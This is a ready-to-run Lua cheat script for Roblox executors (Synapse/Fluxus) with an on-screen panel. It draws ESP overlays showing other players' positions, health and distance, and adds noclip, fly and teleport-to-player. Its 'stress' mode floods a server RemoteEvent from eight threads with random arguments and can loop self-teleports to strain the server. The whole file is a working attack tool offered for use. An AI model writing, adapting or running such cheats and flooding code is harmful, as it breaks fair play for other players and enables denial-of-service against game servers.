-- all_in_one.lua
-- Synapse/Fluxus executor. run once, panel appears top-left.

local Players     = game:GetService("Players")
local RunService  = game:GetService("RunService")
local UIS         = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local TeleportSvc = game:GetService("TeleportService")
local Camera      = workspace.CurrentCamera
local LP          = Players.LocalPlayer

local CFG = {
    esp       = true,
    box       = true,
    name      = true,
    hp        = true,
    dist      = true,
    noclip    = false,
    fly       = false,
    fly_speed = 60,
    tp_offset = 3,
    esp_col   = Color3.fromRGB(255, 130, 70),
    stress    = false,
    mode      = "remote",     -- "remote" | "churn" | "both"
    remote    = nil,          -- "ReplicatedStorage/Remotes/Report"
    rate      = 30,
    workers   = 8,
    churn_dt  = 1.2,
}

local tracked, rows = {}, {}
local rng = Random.new()

-- ── player bus ────────────────────────────────────────
local added   = Instance.new("BindableEvent")
local removed = Instance.new("BindableEvent")
local batch   = Instance.new("BindableEvent")

for _, p in ipairs(Players:GetPlayers()) do added:Fire(p) end
Players.PlayerAdded:Connect(function(p) added:Fire(p); batch:Fire() end)
Players.PlayerRemoving:Connect(function(p) removed:Fire(p); batch:Fire() end)

-- ── esp draws ─────────────────────────────────────────
local function mk(kind, props)
    local d = Drawing.new(kind)
    for k, v in pairs(props) do d[k] = v end
    d.Visible = false
    return d
end

added:Connect(function(p)
    if p == LP or tracked[p] then return end
    tracked[p] = {
        box  = mk("Square", { Thickness = 1, Filled = false }),
        name = mk("Text",   { Size = 14, Center = true, Outline = true, Font = 2 }),
        hp   = mk("Text",   { Size = 12, Outline = true, Font = 0 }),
        dist = mk("Text",   { Size = 12, Center = true, Outline = true, Font = 0 }),
    }
end)

removed:Connect(function(p)
    local e = tracked[p]
    if not e then return end
    for _, d in pairs(e) do pcall(function() d:Remove() end) end
    tracked[p] = nil
end)

local function charOf(p)
    local c = p.Character
    if c and c:FindFirstChild("HumanoidRootPart") and c:FindFirstChildOfClass("Humanoid") then
        return c
    end
end

-- ── render loop ───────────────────────────────────────
RunService.RenderStepped:Connect(function()
    if not CFG.esp then return end
    local myRoot = charOf(LP) and LP.Character.HumanoidRootPart
    for p, e in pairs(tracked) do
        local c = charOf(p)
        if not c then for _, d in pairs(e) do d.Visible = false end continue end
        local hrp = c.HumanoidRootPart
        local top, a = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, 2.5, 0))
        local bot, b = Camera:WorldToViewportPoint(hrp.Position - Vector3.new(0, 2, 0))
        if not (a and b) then for _, d in pairs(e) do d.Visible = false end continue end
        local h, w = math.abs(top.Y - bot.Y), 0
        w = h / 2
        e.box.Size      = Vector2.new(w, h)
        e.box.Position  = Vector2.new(top.X - w / 2, top.Y)
        e.box.Color     = CFG.esp_col
        e.box.Visible   = CFG.box
        e.name.Text     = p.Name
        e.name.Position = Vector2.new(top.X, top.Y - 17)
        e.name.Color    = CFG.esp_col
        e.name.Visible  = CFG.name
        if CFG.hp then
            local hum = c:FindFirstChildOfClass("Humanoid")
            e.hp.Text     = hum and ("%d"):format(math.floor(hum.Health)) or "?"
            e.hp.Position = Vector2.new(top.X - w / 2 - 24, top.Y)
            e.hp.Color    = Color3.fromRGB(120, 255, 120)
            e.hp.Visible  = true
        else e.hp.Visible = false end
        if CFG.dist and myRoot then
            local d = (myRoot.Position - hrp.Position).Magnitude
            e.dist.Text     = ("%.0fm"):format(d)
            e.dist.Position = Vector2.new(top.X, top.Y + h + 18)
            e.dist.Color    = Color3.fromRGB(220, 220, 220)
            e.dist.Visible  = true
        else e.dist.Visible = false end
    end
end)

-- ── noclip ────────────────────────────────────────────
RunService.Stepped:Connect(function()
    if not CFG.noclip then return end
    local c = LP.Character
    if not c then return end
    for _, p in ipairs(c:GetDescendants()) do
        if p:IsA("BasePart") and p.CanCollide then p.CanCollide = false end
    end
end)

-- ── fly ───────────────────────────────────────────────
local flyBV
local function stopFly()
    if flyBV then flyBV:Destroy(); flyBV = nil end
    local c = charOf(LP)
    if c then c.Humanoid.PlatformStand = false end
end

RunService.Heartbeat:Connect(function()
    local c = charOf(LP)
    if not c then return end
    if CFG.fly then
        local hrp = c.HumanoidRootPart
        if not flyBV then
            flyBV = Instance.new("BodyVelocity")
            flyBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
            flyBV.Parent = hrp
        end
        local cam = Camera.CFrame
        local dir = Vector3.zero
        if UIS:IsKeyDown(Enum.KeyCode.W) then dir += cam.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.S) then dir -= cam.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.A) then dir -= cam.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.D) then dir += cam.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.new(0,1,0) end
        if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then dir -= Vector3.new(0,1,0) end
        flyBV.Velocity = dir.Unit * CFG.fly_speed * (dir.Magnitude > 0 and 1 or 0)
        c.Humanoid.PlatformStand = true
    else
        if flyBV then stopFly() end
    end
end)

-- ── stress ────────────────────────────────────────────
local function resolveRemote(path)
    if not path then return nil end
    local node = game
    for seg in path:gmatch("[^/]+") do
        node = node and node:FindFirstChild(seg) or nil
    end
    return node
end

local function failArgs()
    return { rng:NextNumber(), HttpService:GenerateGUID(false) }
end

local floodThreads = {}

local function startFlood()
    local remote = resolveRemote(CFG.remote)
    if not remote then
        warn("[stress] remote not resolved: " .. tostring(CFG.remote))
        return
    end
    local dt = 1 / CFG.rate
    for i = 1, CFG.workers do
        floodThreads[i] = task.spawn(function()
            while CFG.stress do
                pcall(function() remote:FireServer(unpack(failArgs())) end)
                task.wait(dt)
            end
        end)
    end
end

local function startChurn()
    task.spawn(function()
        while CFG.stress do
            pcall(function() TeleportSvc:Teleport(game.PlaceId, LP) end)
            task.wait(CFG.churn_dt)
        end
    end)
end

local function startStress()
    if CFG.mode == "remote" or CFG.mode == "both" then startFlood() end
    if CFG.mode == "churn"  or CFG.mode == "both" then startChurn() end
end

-- ── tp ────────────────────────────────────────────────
local function tpTo(p)
    local mine, tgt = charOf(LP), charOf(p)
    if not (mine and tgt) then return end
    mine.HumanoidRootPart.CFrame = tgt.HumanoidRootPart.CFrame * CFrame.new(0, 0, CFG.tp_offset)
end

-- ── gui ───────────────────────────────────────────────
for _, g in ipairs(LP.PlayerGui:GetChildren()) do
    if g.Name == "AIO" then g:Destroy() end
end

local gui = Instance.new("ScreenGui")
gui.Name, gui.ResetOnSpawn = "AIO", false
gui.Parent = LP:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size, frame.Position = UDim2.new(0, 260, 0, 420), UDim2.new(0, 16, 0.2, 0)
frame.BackgroundColor3, frame.BorderSizePixel = Color3.fromRGB(20, 20, 24), 0
frame.Active, frame.Draggable = true, true
frame.Parent = gui

local head = Instance.new("TextLabel")
head.Size = UDim2.new(1, 0, 0, 26)
head.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
head.BorderSizePixel, head.Font, head.TextSize = 0, Enum.Font.Code, 13
head.TextColor3 = Color3.fromRGB(255, 190, 130)
head.Text = "aio"
head.Parent = frame

local function toggleBtn(y, label, get, set)
    local b = Instance.new("TextButton")
    b.Size, b.Position = UDim2.new(1, -8, 0, 24), UDim2.new(0, 4, 0, y)
    b.BackgroundColor3 = Color3.fromRGB(38, 38, 48)
    b.BorderSizePixel, b.Font, b.TextSize = 0, Enum.Font.Code, 12
    b.TextColor3 = Color3.fromRGB(220, 220, 230)
    b.Text = ("%s: %s"):format(label, get() and "ON" or "OFF")
    b.Parent = frame
    b.MouseButton1Click:Connect(function()
        local nv = not get()
        set(nv)
        b.Text = ("%s: %s"):format(label, nv and "ON" or "OFF")
    end)
    return b
end

toggleBtn(30,  "esp",    function() return CFG.esp end, function(v) CFG.esp = v end)
toggleBtn(56,  "noclip", function() return CFG.noclip end, function(v) CFG.noclip = v end)
toggleBtn(82,  "fly",    function() return CFG.fly end, function(v) CFG.fly = v end)
toggleBtn(108, "stress", function() return CFG.stress end, function(v)
    CFG.stress = v
    if v then startStress() end
end)

local scroll = Instance.new("ScrollingFrame")
scroll.Size, scroll.Position = UDim2.new(1, -8, 1, -142), UDim2.new(0, 4, 0, 138)
scroll.BackgroundTransparency, scroll.BorderSizePixel, scroll.ScrollBarThickness = 1, 0, 4
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.Parent = frame

local layout = Instance.new("UIListLayout")
layout.Padding, layout.SortOrder = UDim.new(0, 2), Enum.SortOrder.LayoutOrder
layout.Parent = scroll

local function rebuild()
    for _, b in pairs(rows) do b:Destroy() end
    table.clear(rows)
    local i = 0
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP then
            i += 1
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, -8, 0, 26)
            btn.BackgroundColor3, btn.BorderSizePixel = Color3.fromRGB(34, 34, 44), 0
            btn.Font, btn.TextSize, btn.LayoutOrder = Enum.Font.Code, 12, i
            btn.TextColor3 = Color3.fromRGB(230, 230, 240)
            btn.Text = ("  %s  [%d]"):format(p.Name, p.UserId)
            btn.Parent = scroll
            btn.MouseButton1Click:Connect(function() tpTo(p) end)
            rows[p] = btn
        end
    end
    task.wait()
    scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 4)
end

rebuild()
batch.Event:Connect(function() task.wait(0.1); rebuild() end)

getgenv().AIO_OFF = function()
    CFG.esp, CFG.fly, CFG.noclip, CFG.stress = false, false, false, false
    stopFly()
    for p in pairs(tracked) do removed:Fire(p) end
    if gui then gui:Destroy() end
end

print("[AIO] up — one panel, tp list, esp, noclip, fly, stress")
